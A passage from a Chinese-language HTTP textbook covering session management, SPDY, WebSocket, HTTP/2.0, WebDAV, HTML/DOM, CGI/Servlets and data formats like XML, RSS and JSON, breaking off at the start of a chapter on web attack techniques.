ID。通过验证从客户端发送过来的登录信息进行身份认证，然后把用户的认证状态与Session ID 绑定后记录在服务器端。向客户端返回响应时，会在首部字段 Set-Cookie 内写入 SessionID（如 PHPSESSID=028a8c…）。你可以把 Session ID 想象成一种用以区分不同用户的等位号。168然而，如果 Session ID 被第三方盗走，对方就可以伪装成你的身份进行恶意操作了。因此必须防止 Session ID 被盗，或被猜出。为了做到这点，Session ID 应使用难以推测的字符串，且服务器端也需要进行有效期的管理，保证其安全性。另外，为减轻跨站脚本攻击（XSS）造成的损失，建议事先在 Cookie内加上 httponly 属性。步骤 3： 客户端接收到从服务器端发来的 Session ID 后，会将其作为Cookie 保存在本地。下次向服务器发送请求时，浏览器会自动发送Cookie，所以 Session ID 也随之发送到服务器。服务器端可通过验证接收到的 Session ID 识别用户和其认证状态。除了以上介绍的应用实例，还有应用其他不同方法的案例。另外，不仅基于表单认证的登录信息及认证过程都无标准化的方法，服务器端应如何保存用户提交的密码等登录信息等也没有标准化。通常，一种安全的保存方法是，先利用给密码加盐（salt） 1 的方式增加额外信息，再使用散列（hash）函数计算出散列值后保存。但是我们也经常看到直接保存明文密码的做法，而这样的做法具有导致密码泄露的风险。1 salt 其实就是由服务器随机生成的一个字符串，但是要保证长度足够长，并且是真正随机生成的。然后把它和密码字符串相连接（前后都可以）生成散列值。当两个用户使用了同一个密码时，由于随机生成的 salt 值不同，对应的散列值也将是不同的。这样一来，很大程度上减少了密码特征，攻击者也就很难利用自己手中的密码特征库进行破解。——译者注169第 9 章　基于 HTTP 的功能追加协议虽然 HTTP 协议既简单又简捷，但随着时代的发展，其功能使用上捉襟见肘的疲态已经凸显。本章我们将讲解基于 HTTP 新增的功能的协议。9.1　基于 HTTP 的协议在建立 HTTP 标准规范时，制订者主要想把 HTTP 当作传输 HTML 文档的协议。随着时代的发展，Web 的用途更具多样性，比如演化成在线购物网站、SNS（Social Networking Service，社交网络服务）、企业或组织内部的各种管理工具，等等。而这些网站所追求的功能可通过 Web 应用和脚本程序实现。即使这些功能已经满足需求，在性能上却未必最优，这是因为 HTTP 协议上的限制以及自身性能有限。HTTP 功能上的不足可通过创建一套全新的协议来弥补。可是目前基于 HTTP 的 Web 浏览器的使用环境已遍布全球，因此无法完全抛弃HTTP。有一些新协议的规则是基于 HTTP 的，并在此基础上添加了170新的功能。9.2　消除 HTTP 瓶颈的 SPDYGoogle 在 2010 年发布了 SPDY（取自 SPeeDY，发音同 speedy），其开发目标旨在解决 HTTP 的性能瓶颈，缩短 Web 页面的加载时间（50%）。SPDY - The Chromium Projects<a href="http://www.chromium.org/spdy/9.2.1" target="_blank" rel="noopener">http://www.chromium.org/spdy/9.2.1</a>　HTTP 的瓶颈在 Facebook 和 Twitter 等 SNS 网站上，几乎能够实时观察到海量用户公开发布的内容，这也是一种乐趣。当几百、几千万的用户发布内容时，Web 网站为了保存这些新增内容，在很短的时间内就会发生大量的内容更新。为了尽可能实时地显示这些更新的内容，服务器上一有内容更新，就需要直接把那些内容反馈到客户端的界面上。虽然看起来挺简单的，但 HTTP 却无法妥善地处理好这项任务。使用 HTTP 协议探知服务器上是否有内容更新，就必须频繁地从客户端到服务器端进行确认。如果服务器上没有内容更新，那么就会产生徒劳的通信。若想在现有 Web 实现所需的功能，以下这些 HTTP 标准就会成为瓶颈。一条连接上只可发送一个请求。请求只能从客户端开始。客户端不可以接收除响应以外的指令。请求 / 响应首部未经压缩就发送。首部信息越多延迟越大。发送冗长的首部。每次互相发送相同的首部造成的浪费较多。171可任意选择数据压缩格式。非强制压缩发送。图：以前的 HTTP 通信Ajax 的解决方法Ajax（Asynchronous JavaScript and XML， 异 步 JavaScript 与 XML 技术）是一种有效利用 JavaScript 和 DOM（Document Object Model，文档对象模型）的操作，以达到局部 Web 页面替换加载的异步通信手段。和以前的同步通信相比，由于它只更新一部分页面，响应中传输的数据量会因此而减少，这一优点显而易见。Ajax 的核心技术是名为 XMLHttpRequest 的 API，通过 JavaScript 脚本语言的调用就能和服务器进行 HTTP 通信。借由这种手段，就能从已加载完毕的 Web 页面上发起请求，只更新局部页面。而利用 Ajax 实时地从服务器获取内容，有可能会导致大量请求产生。另外，Ajax 仍未解决 HTTP 协议本身存在的问题。172图：Ajax 通信Comet 的解决方法一旦服务器端有内容更新了，Comet 不会让请求等待，而是直接给客户端返回响应。这是一种通过延迟应答，模拟实现服务器端向客户端推送（Server Push）的功能。通常，服务器端接收到请求，在处理完毕后就会立即返回响应，但为了实现推送功能，Comet 会先将响应置于挂起状态，当服务器端有内容更新时，再返回该响应。因此，服务器端一旦有更新，就可以立即反馈给客户端。内容上虽然可以做到实时更新，但为了保留响应，一次连接的持续时间也变长了。期间，为了维持连接会消耗更多的资源。另外，Comet也仍未解决 HTTP 协议本身存在的问题。173图：Comet 通信SPDY 的目标陆续出现的 Ajax 和 Comet 等提高易用性的技术，一定程度上使 HTTP得到了改善，但 HTTP 协议本身的限制也令人有些束手无策。为了进行根本性的改善，需要有一些协议层面上的改动。处于持续开发状态中的 SPDY 协议，正是为了在协议级别消除 HTTP所遭遇的瓶颈。9.2.2　SPDY 的设计与功能SPDY 没有完全改写 HTTP 协议，而是在 TCP/IP 的应用层与运输层之间通过新加会话层的形式运作。同时，考虑到安全性问题，SPDY 规定通信中使用 SSL。SPDY 以会话层的形式加入，控制对数据的流动，但还是采用 HTTP建立通信连接。因此，可照常使用 HTTP 的 GET 和 POST 等方 法、Cookie 以及 HTTP 报文等。174图：SPDY 的设计使用 SPDY 后，HTTP 协议额外获得以下功能。多路复用流通过单一的 TCP 连接，可以无限制处理多个 HTTP 请求。所有请求的处理都在一条 TCP 连接上完成，因此 TCP 的处理效率得到提高。赋予请求优先级SPDY 不仅可以无限制地并发处理请求，还可以给请求逐个分配优先级顺序。这样主要是为了在发送多个请求时，解决因带宽低而导致响应变慢的问题。压缩 HTTP 首部压缩 HTTP 请求和响应的首部。这样一来，通信产生的数据包数量和发送的字节数就更少了。推送功能支持服务器主动向客户端推送数据的功能。这样，服务器可直接发送数据，而不必等待客户端的请求。服务器提示功能服务器可以主动提示客户端请求所需的资源。由于在客户端发现资源之前就可以获知资源的存在，因此在资源已缓存等情况下，可以避免175发送不必要的请求。9.2.3　SPDY 消除 Web 瓶颈了吗希望使用 SPDY 时，Web 的内容端不必做什么特别改动，而 Web 浏览器及 Web 服务器都要为对应 SPDY 做出一定程度上的改动。有好几家 Web 浏览器已经针对 SPDY 做出了相应的调整。另外，Web 服务器也进行了实验性质的应用，但把该技术导入实际的 Web 网站却进展不佳。因为 SPDY 基本上只是将单个域名（ IP 地址）的通信多路复用，所以当一个 Web 网站上使用多个域名下的资源，改善效果就会受到限制。SPDY 的确是一种可有效消除 HTTP 瓶颈的技术，但很多 Web 网站存在的问题并非仅仅是由 HTTP 瓶颈所导致。对 Web 本身的速度提升，还应该从其他可细致钻研的地方入手，比如改善 Web 内容的编写方式等。9.3　使用浏览器进行全双工通信的WebSocket利用 Ajax 和 Comet 技术进行通信可以提升 Web 的浏览速度。但问题在于通信若使用 HTTP 协议，就无法彻底解决瓶颈问题。WebSocket网络技术正是为解决这些问题而实现的一套新协议及 API。当时筹划将 WebSocket 作为 HTML5 标准的一部分，而现在它却逐渐变成了独立的协议标准。WebSocket 通信协议在 2011 年 12 月 11 日，被 RFC 6455 - The WebSocket Protocol 定为标准。9.3.1　WebSocket 的设计与功能WebSocket，即 Web 浏览器与 Web 服务器之间全双工通信标准。其中，WebSocket 协议由 IETF 定为标准，WebSocket API 由 W3C 定为标准。仍在开发中的 WebSocket 技术主要是为了解决 Ajax 和 Comet里 XMLHttpRequest 附带的缺陷所引起的问题。9.3.2　WebSocket 协议176一旦 Web 服务器与客户端之间建立起 WebSocket 协议的通信连接，之后所有的通信都依靠这个专用协议进行。通信过程中可互相发送JSON、XML、HTML 或图片等任意格式的数据。由于是建立在 HTTP 基础上的协议，因此连接的发起方仍是客户端，而一旦确立 WebSocket 通信连接，不论服务器还是客户端，任意一方都可直接向对方发送报文。下面我们列举一下 WebSocket 协议的主要特点。推送功能支持由服务器向客户端推送数据的推送功能。这样，服务器可直接发送数据，而不必等待客户端的请求。减少通信量只要建立起 WebSocket 连接，就希望一直保持连接状态。和 HTTP 相比，不但每次连接时的总开销减少，而且由于 WebSocket 的首部信息很小，通信量也相应减少了。为了实现 WebSocket 通信，在 HTTP 连接建立之后，需要完成一次“握手”（Handshaking）的步骤。握手·请求为了实现 WebSocket 通信，需要用到 HTTP 的 Upgrade 首部字段，告知服务器通信协议发生改变，以达到握手的目的。GET /chat HTTP/1.1Host: server.example.comUpgrade: websocketConnection: UpgradeSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==Origin: <a href="http://example.comSec-WebSocket-Protocol" target="_blank" rel="noopener">http://example.comSec-WebSocket-Protocol</a>: chat, superchatSec-WebSocket-Version: 13Sec-WebSocket-Key 字段内记录着握手过程中必不可少的键值。Sec-WebSocket-Protocol 字段内记录使用的子协议。子协议按 WebSocket 协议标准在连接分开使用时，定义那些连接的名称。177握手·响应对于之前的请求，返回状态码 101 Switching Protocols 的响应。HTTP/1.1 101 Switching ProtocolsUpgrade: websocketConnection: UpgradeSec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=Sec-WebSocket-Protocol: chatSec-WebSocket-Accept 的字段值是由握手请求中的 Sec-WebSocket-Key 的字段值生成的。成功握手确立 WebSocket 连接之后，通信时不再使用 HTTP 的数据帧，而采用 WebSocket 独立的数据帧。图：WebSocket 通信WebSocket APIJavaScript 可调用“The WebSocketAPI”（<a href="http://www.w3.org/TR/websockets/，由" target="_blank" rel="noopener">http://www.w3.org/TR/websockets/，由</a> W3C 标准制定）内提供的 WebSocket 程序接口，以实现 WebSocket 协议下全双工通信。以下为调用 WebSocket API，每 50ms 发送一次数据的实例。178var socket = new WebSocket(‘ws://game.example.com:12010/updates’);socket.onopen = function () {setInterval(function() {if (socket.bufferedAmount == 0)socket.send(getUpdateData());}, 50);};9.4　期盼已久的 HTTP/2.0目前主流的 HTTP/1.1 标准，自 1999 年发布的 RFC2616 之后再未进行过改订。SPDY 和 WebSocket 等技术纷纷出现，很难断言 HTTP/1.1仍是适用于当下的 Web 的协议。负责互联网技术标准的 IETF（Internet Engineering Task Force，互联网工程任务组）创立 httpbis（Hypertext Transfer ProtocolBis，<a href="http://datatracker.ietf.org/wg/httpbis/）工作组，其目标是推进下一代" target="_blank" rel="noopener">http://datatracker.ietf.org/wg/httpbis/）工作组，其目标是推进下一代</a> HTTP——HTTP/2.0 在 2014 年 11 月实现标准化。HTTP/2.0 的特点HTTP/2.0 的目标是改善用户在使用 Web 时的速度体验。由于基本上都会先通过 HTTP/1.1 与 TCP 连接，现在我们以下面的这些协议为基础，探讨一下它们的实现方法。SPDYHTTP Speed ＋ MobilityNetwork-Friendly HTTP UpgradeHTTP Speed ＋ Mobility 由微软公司起草，是用于改善并提高移动端通信时的通信速度和性能的标准。它建立在 Google 公司提出的 SPDY与 WebSocket 的基础之上。Network-Friendly HTTP Upgrade 主要是在移动端通信时改善 HTTP 性能的标准。HTTP/2.0 的 7 项技术及讨论179HTTP/2.0 围绕着主要的 7 项技术进行讨论，现阶段（2012 年 8 月 13日），大都倾向于采用以下协议的技术。但是，讨论仍在持续，所以不能排除会发生重大改变的可能性。表 9-1压缩 SPDY、Friendly多路复用 SPDYTLS 义务化 Speed＋ Mobility协商 Speed＋ Mobility，Friendly客户端拉曳（Client Pull）/服务器推送（Server Push）Speed＋ Mobility流量控制 SPDYWebSocket Speed＋ Mobility注：HTTP Speed ＋ Mobility 简写为 Speed ＋ Mobility，Network-Friendly HTTPUpgrade 简写为 Friendly。9.5　Web 服务器管理文件的 WebDAVWebDAV（Web-based Distributed Authoring and Versioning，基于万维网的分布式创作和版本控制）是一个可对 Web 服务器上的内容直接进行文件复制、编辑等操作的分布式文件系统。它作为扩展 HTTP/1.1的协议定义在 RFC4918。除了创建、删除文件等基本功能，它还具备文件创建者管理、文件编辑过程中禁止其他用户内容覆盖的加锁功能，以及对文件内容修改的版本控制功能。180图：WebDAV使用 HTTP/1.1 的 PUT 方法和 DELETE 方法，就可以对 Web 服务器上的文件进行创建和删除操作。可是出于安全性及便捷性等考虑，一般不使用。9.5.1　扩展 HTTP/1.1 的 WebDAV针对服务器上的资源，WebDAV 新增加了一些概念，如下所示。图：WebDAV 扩展的概念181集合（Collection）：是一种统一管理多个资源的概念。以集合为单位可进行各种操作。也可实现类似集合的集合这样的叠加。资源（Resource）：把文件或集合称为资源。属性（Property）：定义资源的属性。定义以“名称 = 值”的格式执行。锁（Lock）：把文件设置成无法编辑状态。多人同时编辑时，可防止在同一时间进行内容写入。9.5.2　WebDAV 内新增的方法及状态码WebDAV 为实现远程文件管理，向 HTTP/1.1 中追加了以下这些方法。PROPFIND ：获取属性PROPPATCH ：修改属性MKCOL ：创建集合COPY ：复制资源及属性MOVE ：移动资源LOCK ：资源加锁UNLOCK ：资源解锁为配合扩展的方法，状态码也随之扩展。102 Processing ：可正常处理请求，但目前是处理中状态207 Multi-Status ：存在多种状态422 Unprocessible Entity ：格式正确，内容有误423 Locked ：资源已被加锁424 Failed Dependency ：处理与某请求关联的请求失败，因此不再维182持依赖关系507 Insufficient Storage ：保存空间不足WebDAV 的请求实例下面是使用 PROPFIND 方法对 <a href="http://www.example.com/file" target="_blank" rel="noopener">http://www.example.com/file</a> 发起获取属性的请求。PROPFIND /file HTTP/1.1Host: <a href="http://www.example.comContent-Type" target="_blank" rel="noopener">www.example.comContent-Type</a>: application/xml; charset=”utf-8”Content-Length: 219&lt;?xml version=”1.0” encoding=”utf-8” ?&gt;&lt;D:propfind xmlns:D=”DAV:”&gt;&lt;D:prop xmlns:R=”<a href="http://ns.example.com/boxschema/&quot;&gt;" target="_blank" rel="noopener">http://ns.example.com/boxschema/&quot;&gt;</a>&lt;R:bigbox/&gt;&lt;R:author/&gt;&lt;R:DingALing/&gt;&lt;R:Random/&gt;&lt;/D:prop&gt;&lt;/D:propfind&gt;WebDAV 的响应实例下面是针对之前的 PROPFIND 方法，返回<a href="http://www.example.com/file" target="_blank" rel="noopener">http://www.example.com/file</a> 的属性的响应。HTTP/1.1 207 Multi-StatusContent-Type: application/xml; charset=”utf-8”Content-Length: 831&lt;?xml version=”1.0” encoding=”utf-8” ?&gt;&lt;D:multistatus xmlns:D=”DAV:”&gt;&lt;D:response xmlns:R=”<a href="http://ns.example.com/boxschema/&quot;&gt;" target="_blank" rel="noopener">http://ns.example.com/boxschema/&quot;&gt;</a>&lt;D:href&gt;<a href="http://www.example.com/file" target="_blank" rel="noopener">http://www.example.com/file</a>&lt;/D:href&gt;&lt;D:propstat&gt;&lt;D:prop&gt;&lt;R:bigbox&gt;&lt;R:BoxType&gt;Box type A&lt;/R:BoxType&gt;&lt;/R:bigbox&gt;183 &lt;R:author&gt;&lt;R:Name&gt;J.J. Johnson&lt;/R:Name&gt;&lt;/R:author&gt;&lt;/D:prop&gt;&lt;D:status&gt;HTTP/1.1 200 OK&lt;/D:status&gt;&lt;/D:propstat&gt;&lt;D:propstat&gt;&lt;D:prop&gt;&lt;R:DingALing/&gt;&lt;R:Random/&gt;&lt;/D:prop&gt;&lt;D:status&gt;HTTP/1.1 403 Forbidden&lt;/D:status&gt;&lt;D:responsedescription&gt; The user does not have access to the&lt;/D:responsedescription&gt;&lt;/D:propstat&gt;&lt;/D:response&gt;&lt;D:responsedescription&gt; There has been an access violation error&lt;/D:responsedescription&gt;&lt;/D:multistatus&gt;为何 HTTP 协议受众如此广泛本章讲解了几个与 HTTP 相关联的协议使用案例。为什么 HTTP 协议受众能够如此广泛呢？过去，新编写接入互联网的系统或软件时，还需要同时编写实现与必要功能对应的新协议。但最近，使用 HTTP 的系统和软件占了绝大多数。这有着诸多原因，其中与企业或组织的防火墙设定有着莫大的关系。防火墙的基本功能就是禁止非指定的协议和端口号的数据包通过。因此如果使用新协议或端口号则必须修改防火墙设置。互联网上，使用率最高的当属 Web。不管是否具备访问 FTP 和SSH 的权限，一般公司都会开放对 Web 的访问。Web 是基于 HTTP协议运作的，因此在构建 Web 服务器或访问 Web 站点时，需事先设置防火墙 HTTP（80/tcp）和 HTTPS（443/tcp）的权限。许多公司或组织已设定权限将 HTTP 作为通信环境，因此无须再修改防火墙的设定。可见 HTTP 具有导入简单这一大优势。而这也是基于 HTTP 服务或内容不断增加的原因之一。还有一些其他原因，比如，作为 HTTP 客户端的浏览器已相当普遍，HTTP 服务器的数量已颇具规模，HTTP 本身就是优异的应用184等。185第 10 章　构建 Web 内容的技术在 Web 刚出现时，我们只能浏览那些页面样式简单的内容。如今，Web 使用各种各样的技术，来呈现丰富多彩的内容。10.1　HTML10.1.1　Web 页面几乎全由 HTML 构建HTML（HyperText Markup Language，超文本标记语言）是为了发送Web 上的超文本（Hypertext）而开发的标记语言。超文本是一种文档系统，可将文档中任意位置的信息与其他信息（文本或图片等）建立关联，即超链接文本。标记语言是指通过在文档的某部分穿插特别的字符串标签，用来修饰文档的语言。我们把出现在 HTML 文档内的这种特殊字符串叫做 HTML 标签（Tag）。平时我们浏览的 Web 页面几乎全是使用 HTML 写成的。由 HTML 构成的文档经过浏览器的解析、渲染后，呈现出来的结果就是 Web 页面。186图：HTML以下就是用 HTML 编写的文档的例子。而这份 HTML 文档内这种被 &lt;&gt; 包围着的文字就是标签。在标签的作用下，文档会改变样式，或插入图片、链接。<html><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>hackr.jp</title><style type="text/css">.logo {padding: 20px;text-align: center;}</style></head><body><div class="logo"><p><img src="photo.jpg" alt="photo" width="240" height="127"></p><p><img src="hackr.gif" alt="hackr.jp" width="240" height="84">&lt;/p</p><p><a href="http://hackr.jp/" target="_blank" rel="noopener">hackr.jp</a> </p></div></body></html>10.1.2　HTML 的版本Tim Berners-Lee 提出 HTTP 概念的同时，还提出了 HTML 原型。1993187年在伊利诺伊大学的 NCSA（The National Center for SupercomputingApplications，国家超级计算机应用中心）发布了 Mosaic 浏览器（世界首个图形界面浏览器程序），而能够被 Mosaic 解析的 HTML，统一标准后即作为 HTML 1.0 发布。目前的最新版本是 HTML4.01 标准，1999 年 12 月 W3C（World WideWeb Consortium）组织推荐使用这一版本。下一个版本，预计会在2014 年左右正式推荐使用 HTML5 标准。HTML5 标准不仅解决了浏览器之间的兼容性问题，并且可把文本作为数据对待，更容易复用，动画等效果也变得更生动。时至今日，HTML 仍存在较多悬而未决问题。有些浏览器未遵循HTML 标准实现，或扩展自用标签等，这都反映了 HTML 的标准实际上尚未统一这一现状。10.1.3　设计应用 CSSCSS（Cascading Style Sheets，层叠样式表）可以指定如何展现 HTML内的各种元素，属于样式表标准之一。即使是相同的 HTML 文档，通过改变应用的 CSS，用浏览器看到的页面外观也会随之改变。CSS的理念就是让文档的结构和设计分离，达到解耦的目的。下面让我们来看一个 CSS 的用例。.logo {padding: 20px;text-align: center;}可在选择器（selector）.logo 的指定范围内，使用 {} 括起来的声明块中写明的 padding: 20px 等声明语句应用指定的样式。可通过指定 HTML 元素或特定的 class、ID 等作为选择器来限定样式的应用范围。10.2　动态 HTML10.2.1　让 Web 页面动起来的动态 HTML188所谓动态 HTML（Dynamic HTML），是指使用客户端脚本语言将静态的 HTML 内容变成动态的技术的总称。鼠标单击点开的新闻、Google Maps 等可滚动的地图就用到了动态 HTML。动态 HTML 技术是通过调用客户端脚本语言 JavaScript，实现对HTML 的 Web 页面的动态改造。利用 DOM（Document ObjectModel，文档对象模型）可指定欲发生动态变化的 HTML 元素。10.2.2　更易控制 HTML 的 DOMDOM 是用以操作 HTML 文档和 XML 文档的 API（ApplicationProgramming Interface，应用编程接口）。使用 DOM 可以将 HTML 内的元素当作对象操作，如取出元素内的字符串、改变那个 CSS 的属性等，使页面的设计发生改变。通过调用 JavaScript 等脚本语言对 DOM 的操作，可以以更为简单的方式控制 HTML 的改变。<body><h1>繁琐的Web安全</h1><p>第Ⅰ部分 Web的构成元素</p><p>第Ⅱ部分 浏览器的安全功能</p><p>第Ⅲ部分 接下来发生的事</p></body>比如，从 JavaScript 的角度来看，将上述 HTML 文档的第 3 个 P 元素（P 标签）改变文字颜色时，会像下方这样编写代码。<script type="text/javascript">var content = document.getElementsByTagName(‘P’);content[2].style.color = ‘#FF0000’;</script>document.getElementsByTagName(‘P’) 语句调用 getElementsByTagName函数，从整个 HTML 文档（document object）内取出 P 元素。接下来的 content[2].style.color = ‘#FF0000’ 语句指定 content 的索引为 2（第 3个）的元素的样式颜色改为红色（#FF0000）。DOM 内存在各种函数，使用它们可查阅 HTML 中的各个元素。18910.3　Web 应用10.3.1　通过 Web 提供功能的 Web 应用Web 应用是指通过 Web 功能提供的应用程序。比如购物网站、网上银行、SNS、BBS、搜索引擎和 e-learning 等。互联网（Internet）或企业内网（Intranet）上遍布各式各样的 Web 应用。原本应用 HTTP 协议的 Web 的机制就是对客户端发来的请求，返回事前准备好的内容。可随着 Web 越来越普及，仅靠这样的做法已不足以应对所有的需求，更需要引入由程序创建 HTML 内容的做法。类似这种由程序创建的内容称为动态内容，而事先准备好的内容称为静态内容。Web 应用则作用于动态内容之上。图：动态内容和静态内容10.3.2　与 Web 服务器及程序协作的 CGICGI（Common Gateway Interface，通用网关接口）是指 Web 服务器在接收到客户端发送过来的请求后转发给程序的一组机制。在 CGI 的作用下，程序会对请求内容做出相应的动作，比如创建 HTML 等动190态内容。使用 CGI 的程序叫做 CGI 程序，通常是用 Perl、PHP、Ruby 和 C 等编程语言编写而成。图：CGI有关 CGI 更为翔实的内容请参考 RFC3875“The Common GatewayInterface (CGI) Version 1.1”10.3.3　因 Java 而普及的 ServletServlet 1 是一种能在服务器上创建动态内容的程序。Servlet 是用 Java语言实现的一个接口，属于面向企业级 Java（JavaEE，JavaEnterprise Edition）的一部分。1 没有对应中文译名，全称是 Java Servlet。名称取自 Servlet=Server+Applet，表示轻量服务程序。——译者注之前提及的 CGI，由于每次接到请求，程序都要跟着启动一次。因此一旦访问量过大，Web 服务器要承担相当大的负载。而 Servlet 运行在与 Web 服务器相同的进程中，因此受到的负载较小 2 。Servlet 的运行环境叫做 Web 容器或 Servlet 容器。2 Servlet 常驻内存，因此在每次请求时，可启动相对进程级别更为轻量的191Servlet，程序的执行效率从而变得更高。——译者注Servlet 作为解决 CGI 问题的对抗技术 3 ，随 Java 一起得到了普及。3 说对抗的原因在于，这个方向上已存在用 Perl 编写的 CGI，实现在 ApacheHTTP Server 上内置 mod_php 模块后可运行 PHP 程序、微软主导的 ASP 等技术。——译者注图：Servlet随着 CGI 的普及，每次请求都要启动新 CGI 程序的 CGI 运行机制逐渐变成了性能瓶颈，所以之后 Servlet 和 mod_perl 等可直接在 Web 服务器上运行的程序才得以开发、普及。10.4　数据发布的格式及语言10.4.1　可扩展标记语言XML（eXtensible Markup Language，可扩展标记语言）是一种可按应用目标进行扩展的通用标记语言。旨在通过使用 XML，使互联网数据共享变得更容易。XML 和 HTML 都是从标准通用标记语言 SGML（Standard Generalized192Markup Language）简化而成。与 HTML 相比，它对数据的记录方式做了特殊处理。下面我们以 HTML 编写的某公司的研讨会议议程为例进行说明。<html><head><meta name="generator" content="Hexo 3.8.0"><title>T公司研讨会介绍</title></head><body><h1>T公司研讨会介绍</h1><ul><li>研讨会编号：TR001<ul><li>Web应用程序脆弱性诊断讲座</li></ul></li><li>研讨会编号：TR002<ul><li>网络系统脆弱性诊断讲座</li></ul></li></ul></body></html>用浏览器打开该文档时，就会显示排列的列表内容，但如果这些数据被其他程序读取会发生什么？某些程序虽然具备可通过识别布局特征取出文本的方法，但这份 HTML 的样式一旦改变，要读取数据内容也就变得相对困难了。可见，为了保持数据的正确读取，HTML 不适合用来记录数据结构。接着将这份列表以 XML 的形式改写就成了以下的示例。&lt;研讨会 编号=”TR001” 主题=”Web应用程序脆弱性诊断讲座”&gt;&lt;类别&gt;安全&lt;/类别&gt;&lt;概要&gt;为深入研究Web应用程序脆弱性诊断必要的…&lt;/概要&gt;&lt;/研讨会&gt;&lt;研讨会 编号=”TR002” 主题=”网络系统脆弱性诊断讲座”&gt;&lt;类别&gt;安全&lt;/类别&gt;&lt;概要&gt;为深入研究网络系统脆弱性诊断必要的…&lt;/概要&gt;&lt;/研讨会&gt;193XML 和 HTML 一样，使用标签构成树形结构，并且可自定义扩展标签。从 XML 文档中读取数据比起 HTML 更为简单。由于 XML 的结构基本上都是用标签分割而成的树形结构，因此通过语法分析器（Parser）的解析功能解析 XML 结构并取出数据元素，可更容易地对数据进行读取。更容易地复用数据使得 XML 在互联网上被广泛接受。比如，可用在2 个不同的应用之间的交换数据格式化。10.4.2　发布更新信息的 RSS/AtomRSS（简易信息聚合，也叫聚合内容）和 Atom 都是发布新闻或博客日志等更新信息文档的格式的总称。两者都用到了 XML。RSS 有以下版本，名称和编写方式也不相同。RSS 0.9（RDF Site Summary）：最初的 RSS 版本。1999 年 3 月由网景通信公司自行开发用于其门户网站。基础构图创建在初期的 RDF规格上。RSS 0.91（Rich Site Summary）：在 RSS0.9 的基础上扩展元素，于1999 年 7 月开发完毕。非 RDF 规格，使用 XML 方式编写。RSS 1.0（RDF Site Summary）：RSS 规格正处于混乱状态。2000 年12 月由 RSS-DEV 工作组再次采用 RSS0.9 中使用的 RDF 规格发布。RSS2.0（Really Simple Syndication）：非 RSS1.0 发展路线。增加支持 RSS0.91 的兼容性，2000 年 12 月由 UserLand Software 公司开发完成。Atom 具有以下两种标准。Atom 供稿格式（Atom Syndication Format）：为发布内容而制定的网站消息来源格式，单讲 Atom 时，就是指此标准。Atom 出版协定（Atom Publishing Protocol）：为 Web 上内容的新增或修改而制定的协议。194用于订阅博客更新信息的 RSS 阅读器，这种应用几乎支持 RSS 的所有版本以及 Atom。下面是 RSS1.0 的示例。&lt;?xml version=”1.0” encoding=”utf-8” ?&gt;&lt;?xml-stylesheet href=”<a href="http://d.hatena.ne.jp/sen-u/rssxsl&quot;" target="_blank" rel="noopener">http://d.hatena.ne.jp/sen-u/rssxsl&quot;</a> type=”text/<a href="rdf:RDFxmlns=&quot;http://purl.org/rss/1.0/&quot;xmlns:rdf=&quot;http://www.w3.org/1999/02/22-rdf-syntax-ns#&quot;xmlns:content=&quot;http://purl.org/rss/1.0/modules/content/&quot;xmlns:dc=&quot;http://purl.org/dc/elements/1.1/&quot;xml:lang=&quot;ja&quot;" target="_blank" rel="noopener">rdf:RDFxmlns=&quot;http://purl.org/rss/1.0/&quot;xmlns:rdf=&quot;http://www.w3.org/1999/02/22-rdf-syntax-ns#&quot;xmlns:content=&quot;http://purl.org/rss/1.0/modules/content/&quot;xmlns:dc=&quot;http://purl.org/dc/elements/1.1/&quot;xml:lang=&quot;ja&quot;</a><channel rdf:about="http://d.hatena.ne.jp/sen-u/rss"><title>兔子的文学日记</title><link><a href="http://d.hatena.ne.jp/sen-u/" target="_blank" rel="noopener">http://d.hatena.ne.jp/sen-u/</a><description>兔子的文学日记</description></channel><item rdf:about="http://d.hatena.ne.jp/sen-u/20121215/p1"><title>[security]提供脆弱性悬赏奖金计划的网站一览</title><link><a href="http://d.hatena.ne.jp/sen-u/20121215/p1" target="_blank" rel="noopener">http://d.hatena.ne.jp/sen-u/20121215/p1</a><description> 正是所谓“是所谓 Bounty Programs”、处理接受Web脆弱性的相关信<a href="dc:creator" target="_blank" rel="noopener">dc:creator</a>sen-u&lt;/dc:creator&gt;<a href="dc:date" target="_blank" rel="noopener">dc:date</a>2012-12-15&lt;/dc:date&gt;<a href="dc:subject" target="_blank" rel="noopener">dc:subject</a>security&lt;/dc:subject&gt;</description></item>10.4.3　JavaScript 衍生的轻量级易用 JSONJSON（JavaScript Object Notation）是一种以JavaScript（ECMAScript）的对象表示法为基础的轻量级数据标记语言。能够处理的数据类型有 false/null/true/ 对象 / 数组 / 数字 / 字符串，这 7 种类型。{“name”: “Web Application Security”, “num”: “TR001”}JSON 让数据更轻更纯粹，并且 JSON 的字符串形式可被 JavaScript轻易地读入。当初配合 XML 使用的 Ajax 技术也让 JSON 的应用变得更为广泛。另外，其他各种编程语言也提供丰富的库类，以达到轻便操作 JSON 的目的。195有关 JSON 更为翔实的内容请参考 RFC4627“The application/jsonMedia Type for JavaScript Object Notation (JSON)”196第 11 章　Web 的攻击技术互联网上的攻击大都将 Web 站点作为目标。本章讲解具体有哪些攻击 Web 站点的手段，以及攻击会造成怎样的影响。11.1　针对 Web 的攻击技术简单的 HTTP 协议本身并不存在安全性问题，因此协议本身几乎不会成为攻击的对象。应用 HTTP 协议的服务器和客户端，以及运行在服务器上的 Web 应用等资源才是攻击目标。目前，来自互联网的攻击大多是冲着 Web 站点来的，它们大多把Web 应用作为攻击目标。本章主要针对 Web 应用的攻击技术进行讲解。197图：攻击事件倾向11.1.1　HTTP 不具备必要的安全功能与最初的设计相比，现今的 Web 网站应用的 HTTP 协议的使用方式已发生了翻天覆地的变化。几乎现今所有的 Web 网站都会使用会话（session）管理、加密处理等安全性方面的功能，而 HTTP 协议内并不具备这些功能。从整体上看，HTTP 就是一个通用的单纯协议机制。因此它具备较多优势，但是在安全性方面则呈劣势。就拿远程登录时会用到的 SSH 协议来说，SSH 具备协议级别的认证及会话管理等功能，HTTP 协议则没有。另外在架设 SSH 服务方面，任何人都可以轻易地创建安全等级高的服务，而 HTTP 即使已架设好服务器，但若想提供服务器基础上的 Web 应用，很多情况下都需要重新开发。因此，开发者需要自行设计并开发认证及会话管理功能来满足 Web应用的安全。而自行设计就意味着会出现各种形形色色的实现。结果，安全等级并不完备，可仍在运作的 Web 应用背后却隐藏着各种容易被攻击者滥用的安全漏洞的 Bug。11.1.2　在客户端即可篡改请求198在 Web 